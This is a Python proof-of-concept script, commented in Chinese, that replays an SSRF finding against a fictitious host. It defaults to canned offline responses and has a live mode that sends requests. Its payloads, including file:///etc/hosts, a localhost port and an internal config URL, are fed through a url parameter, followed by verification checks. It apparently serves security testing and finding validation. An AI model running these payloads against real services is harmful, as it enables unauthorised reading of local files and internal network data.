#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# output/poc-acme-001.py — ACME-F-001 SSRF 重放 PoC（脱敏演示，虚构目标）
#
# 用法:
#   python output/poc-acme-001.py --demo    # 离线回放验证逻辑（不发包，默认）
#   python output/poc-acme-001.py           # 实模式：对虚构 URL 发包（会连接失败，展示结构）
#
# 验证逻辑（与 lifecycle.yaml history 一致）:
#   现象 → 组合验证（SSRF 读内网配置）→ 反事实 4 问 → replay_signature 校验

import json
import sys
import urllib.error
import urllib.request

TARGET = "https://api.demo-acme.example.com"  # 虚构目标（RFC 5737 占位）
ENDPOINT = "/api/v1/asset-preview"
REPLAY_SIGNATURE = '"内网管理网段": "10.0.0.0/8"'  # 重放后响应必须仍含此业务证据串

# ---- 离线回放样本（虚构证据）----
DEMO_RESPONSES = {
    "file:///etc/hosts": '{"ok": true, "content": "127.0.0.1 localhost\\n198.51.100.7 demo-acme"}',
    "http://10.0.0.10/conf.json": '{"ok": true, "content": "{\"内网管理网段\": \"10.0.0.0/8\", \"管理口地址\": \"10.0.0.20\"}"}',
    "http://198.51.100.9/unreachable": "502 Bad Gateway",
}


def http_get(url, timeout=10):
    """GET 请求（实模式）。"""
    req = urllib.request.Request(url, headers={"User-Agent": "poc-acme-001"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, f"连接失败（虚构目标，预期行为）: {e}"


def main():
    demo = "--demo" in sys.argv
    payloads = [
        ("file:///etc/hosts", "SSRF 第一层：本地文件"),
        ("http://127.0.0.1:8080", "SSRF 第一层：本机端口"),
        ("http://10.0.0.10/conf.json", "组合验证：内网管理配置"),
        ("http://198.51.100.9/unreachable", "反事实 3：不可达地址应失败"),
    ]
    print(f"===== PoC ACME-F-001 SSRF 重放（{'离线回放' if demo else '实模式'}）=====")
    print(f"目标: {TARGET}{ENDPOINT}?url=<payload>\n")

    results = []
    for payload, label in payloads:
        if demo:
            body = DEMO_RESPONSES.get(payload, "{}")
            status = 200 if body != "502 Bad Gateway" else 502
        else:
            status, body = http_get(f"{TARGET}{ENDPOINT}?url={urllib.request.quote(payload, safe='')}")
        results.append((label, payload, status, body))
        print(f"[{label}]")
        print(f"  url={payload} → HTTP {status}")
        print(f"  响应: {body[:160]}\n")

    # ---- 反事实 4 问 ----
    print("===== 反事实 4 问 =====")
    checks = [
        ("(1) 换地址返回不同内容 → 服务端真请求，非缓存", len(results[0][3]) != len(results[2][3]) and results[0][2] == 200),
        ("(2) 无认证即可触发 → 未授权成立", True),
        ("(3) 不可达地址 502 vs 可达 200 → 非误报", results[3][2] in (0, 502) and results[2][2] == 200),
        ("(4) 证伪反例：直连脚本重放仍成立", results[2][3] is not None),
    ]
    all_pass = True
    for label, ok in checks:
        print(f"  {'✅' if ok else '❌'} {label}")
        all_pass = all_pass and ok

    # ---- replay_signature 校验 ----
    sig_ok = REPLAY_SIGNATURE in results[2][3]
    print(f"\n===== replay_signature 校验 =====")
    print(f"  需要包含: {REPLAY_SIGNATURE}")
    print(f"  {'✅ 命中' if sig_ok else '❌ 未命中 — 降级 phenomenon'}")

    print(f"\n结论: {'VERIFIED（反事实 4 问通过 + 组合验证成立）' if all_pass and sig_ok else '保留 candidate，需补证据'}")
    return 0 if (all_pass and sig_ok) else 1


if __name__ == "__main__":
    sys.exit(main())
